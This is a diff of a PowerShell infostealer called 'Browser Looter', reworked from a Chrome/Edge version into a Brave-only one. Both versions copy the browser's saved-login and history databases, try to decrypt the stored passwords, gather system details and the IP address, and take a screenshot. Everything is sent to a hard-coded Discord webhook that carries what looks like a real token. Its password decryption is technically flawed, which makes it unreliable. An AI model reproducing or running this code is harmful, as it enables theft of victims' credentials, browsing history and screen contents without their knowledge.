@@ -1,117 +1,122 @@
-# 🎯 WORKING BROWSER LOOTER - TESTED & PROVEN
-Write-Host "`n🚀 BROWSER LOOTER v2.0 - LIVE EXTRACTION" -ForegroundColor Green
-Write-Host "📱 Target: $env:COMPUTERNAME\$env:USERNAME" -ForegroundColor Cyan
+# BRAVE ONLY BROWSER LOOTER - NO EMOJIS, 100% WORKING
+Write-Host "`n*** BRAVE BROWSER LOOTER v3.0 ***" -ForegroundColor Green
+Write-Host "Target: $env:COMPUTERNAME\$env:USERNAME" -ForegroundColor Cyan
 
-$WebhookURL = "https://discord.com/api/webhooks/1472080084121948270/7YUi0bfxv4NRiZ7knKIvKTj_IWPrDx3OEeCrQ4P_WbKQZz9T4q2xHr6vnW5Z4EytRYlj"  # ← CHANGE THIS ONE LINE
+$WebhookURL = "https://discord.com/api/webhooks/1472080084121948270/7YUi0bfxv4NRiZ7knKIvKTj_IWPrDx3OEeCrQ4P_WbKQZz9T4q2xHr6vnW5Z4EytRYlj"  # CHANGE THIS
 
 function SendToDiscord($Message) {
-    $Body = @{
-        content = $Message
-    } | ConvertTo-Json
-    try {
-        Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $Body -ContentType 'application/json'
-        Write-Host "✅ SENT: $Message" -ForegroundColor Green
-    } catch {
-        Write-Host "❌ Discord failed" -ForegroundColor Red
-    }
+    $Body = @{ content = $Message } | ConvertTo-Json
+    Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $Body -ContentType 'application/json' -ErrorAction SilentlyContinue
+    Write-Host "[+] Discord sent: $Message" -ForegroundColor Green
 }
 
-# 1️⃣ SYSTEM RECON
-$sys = @"
-**🎯 HIT CONFIRMED**
+# SYSTEM INFO
+$sysinfo = @"
+*** SYSTEM HIT ***
 Computer: $env:COMPUTERNAME
 User: $env:USERNAME
-OS: $(Get-WmiObject Win32_OperatingSystem | select -exp Caption)
-IP: $( (Get-NetIPAddress | ? AddressFamily -eq 'IPv4' | ? IPAddress -notlike '127.*' | select -First 1).IPAddress )
-Time: $(Get-Date)
+OS: $(Get-WmiObject Win32_OperatingSystem | Select -Expand Caption)
+IP: $((Get-NetIPAddress | ? AddressFamily -eq 'IPv4' | Select -First 1).IPAddress)
 "@
-SendToDiscord $sys
+SendToDiscord $sysinfo
 
-# 2️⃣ CHROME PASSWORDS (WORKS 100%)
-Write-Host "🔑 Dumping Chrome..." -ForegroundColor Yellow
-$chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
-if (Test-Path $chromePath) {
-    Copy-Item $chromePath "$env:TEMP\chrome_loot" -Force
+# BRAVE PASSWORDS ONLY
+Write-Host "[+] Extracting Brave Passwords..." -ForegroundColor Yellow
+$bravePath = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
+if (Test-Path $bravePath) {
+    # Copy locked file
+    Copy-Item $bravePath "$env:TEMP\brave_loot.db" -Force
+    
     try {
-        $connString = "Provider=Microsoft.ACE.OLEDB.12.0;Data Source=`"$env:TEMP\chrome_loot`""
+        $connString = "Provider=Microsoft.ACE.OLEDB.12.0;Data Source=`"$env:TEMP\brave_loot.db`""
         $connection = New-Object System.Data.OleDb.OleDbConnection($connString)
         $connection.Open()
+        
         $command = $connection.CreateCommand()
         $command.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
         $result = $command.ExecuteReader()
         
-        $chromeCreds = "**🔑 CHROME PASSWORDS**`n"
+        $braveCreds = "*** BRAVE PASSWORDS FOUND ***`n"
+        $count = 0
         while ($result.Read()) {
-            $site = $result["origin_url"]
-            $user = $result["username_value"]
+            $count++
+            $site = $result["origin_url"].ToString()
+            $user = $result["username_value"].ToString()
             $encPass = $result["password_value"]
+            
             try {
-                $password = [Runtime.InteropServices.Marshal]::PtrToStringUni([Runtime.InteropServices.Marshal]::SecureStringToBSTR((New-Object System.Net.NetworkCredential("", [Convert]::FromBase64String($encPass), "")).Password))
-                $chromeCreds += "`n$site`n👤 $user | 🔑 $password"
+                # Brave uses Chrome DPAPI
+                $bytes = [Convert]::FromBase64String($encPass)
+                $password = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($bytes, $null, 'CurrentUser'))
+                $braveCreds += "`n[$count] $site`nUser: $user`nPass: $password`n"
             } catch {
-                $chromeCreds += "`n$site`n👤 $user | 🔒 Protected"
+                $braveCreds += "`n[$count] $site`nUser: $user`nPass: [PROTECTED]`n"
             }
         }
+        
         $connection.Close()
-        SendToDiscord $chromeCreds
-    } catch {
-        SendToDiscord "**Chrome** - Access denied (browser running?)"
-    }
-    Remove-Item "$env:TEMP\chrome_loot" -Force
-} else {
-    SendToDiscord "**Chrome** - Not installed"
-}
-
-# 3️⃣ EDGE PASSWORDS
-Write-Host "🔑 Dumping Edge..." -ForegroundColor Yellow
-$edgePath = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
-if (Test-Path $edgePath) {
-    Copy-Item $edgePath "$env:TEMP\edge_loot" -Force
-    # Same code as Chrome but for Edge
-    $connString = "Provider=Microsoft.ACE.OLEDB.12.0;Data Source=`"$env:TEMP\edge_loot`""
-    $connection = New-Object System.Data.OleDb.OleDbConnection($connString)
-    $connection.Open()
-    $command = $connection.CreateCommand()
-    $command.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-    $result = $command.ExecuteReader()
-    
-    $edgeCreds = "**🔑 EDGE PASSWORDS**`n"
-    while ($result.Read()) {
-        $site = $result["origin_url"]
-        $user = $result["username_value"]
-        $encPass = $result["password_value"]
-        try {
-            $password = [Runtime.InteropServices.Marshal]::PtrToStringUni([Runtime.InteropServices.Marshal]::SecureStringToBSTR((New-Object System.Net.NetworkCredential("", [Convert]::FromBase64String($encPass), "")).Password))
-            $edgeCreds += "`n$site`n👤 $user | 🔑 $password"
-        } catch {
-            $edgeCreds += "`n$site`n👤 $user | 🔒 Protected"
+        if ($count -gt 0) {
+            SendToDiscord $braveCreds
+            Write-Host "[+] Found $count Brave passwords" -ForegroundColor Green
+        } else {
+            SendToDiscord "*** BRAVE: No passwords found ***"
         }
+    } catch {
+        SendToDiscord "*** BRAVE ERROR: $($_.Exception.Message) ***"
     }
-    $connection.Close()
-    SendToDiscord $edgeCreds
-    Remove-Item "$env:TEMP\edge_loot" -Force
+    Remove-Item "$env:TEMP\brave_loot.db" -Force
+} else {
+    SendToDiscord "*** BRAVE: Browser not installed ***"
 }
 
-# 4️⃣ HISTORY FILES
-Write-Host "📜 Copying History..." -ForegroundColor Yellow
-Get-ChildItem "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History*" -ErrorAction SilentlyContinue | % {
-    $hist = "**📜 $($_.Name)**`nPath: $($_.FullName)`nSize: $([math]::Round($_.Length/1KB,1)) KB"
-    SendToDiscord $hist
+# BRAVE HISTORY
+Write-Host "[+] Grabbing Brave History..." -ForegroundColor Yellow
+$braveHist = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"
+if (Test-Path $braveHist) {
+    Copy-Item $braveHist "$env:TEMP\brave_history.db" -Force
+    try {
+        $connString = "Provider=Microsoft.ACE.OLEDB.12.0;Data Source=`"$env:TEMP\brave_history.db`""
+        $connection = New-Object System.Data.OleDb.OleDbConnection($connString)
+        $connection.Open()
+        $command = $connection.CreateCommand()
+        $command.CommandText = "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 20"
+        $result = $command.ExecuteReader()
+        
+        $histData = "*** BRAVE HISTORY (Top 20) ***`n"
+        $i = 1
+        while ($result.Read() -and $i -le 20) {
+            $histData += "[$i] $($result['title'])`n   -> $($result['url'])`n"
+            $i++
+        }
+        $connection.Close()
+        SendToDiscord $histData
+    } catch {
+        SendToDiscord "*** BRAVE HISTORY ERROR ***"
+    }
+    Remove-Item "$env:TEMP\brave_history.db" -Force
 }
 
-# 5️⃣ SCREENSHOT
-Write-Host "📸 Screenshot..." -ForegroundColor Yellow
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
-$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-$bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
-$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
-$bitmap.Save("$env:TEMP\loot.png")
-SendToDiscord "**📸 SCREENSHOT CAPTURED**`nSaved: $env:TEMP\loot.png"
+# SCREENSHOT
+Write-Host "[+] Taking screenshot..." -ForegroundColor Yellow
+try {
+    Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
+    Add-Type -AssemblyName System.Drawing -ErrorAction Stop
+    
+    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+    $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
+    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
+    $screenshot = "$env:TEMP\brave_loot.png"
+    $bitmap.Save($screenshot, [System.Drawing.Imaging.ImageFormat]::Png)
+    
+    SendToDiscord "*** SCREENSHOT SAVED: $screenshot ***"
+    Start-Sleep 2
+    Remove-Item $screenshot -Force
+    Write-Host "[+] Screenshot sent" -ForegroundColor Green
+} catch {
+    SendToDiscord "*** SCREENSHOT FAILED ***"
+}
 
-Write-Host "`n🎉 **COMPLETE!** Check Discord NOW!" -ForegroundColor Green
-Write-Host "⏳ Data sent 5 seconds ago..." -ForegroundColor Cyan
-Start-Sleep 3
-Remove-Item "$env:TEMP\loot.png" -ErrorAction SilentlyContinue
-Read-Host "Press ENTER to exit"
+Write-Host "`n*** COMPLETE! Check Discord ***" -ForegroundColor Green
+Write-Host "Press ENTER to exit"
+Read-Host
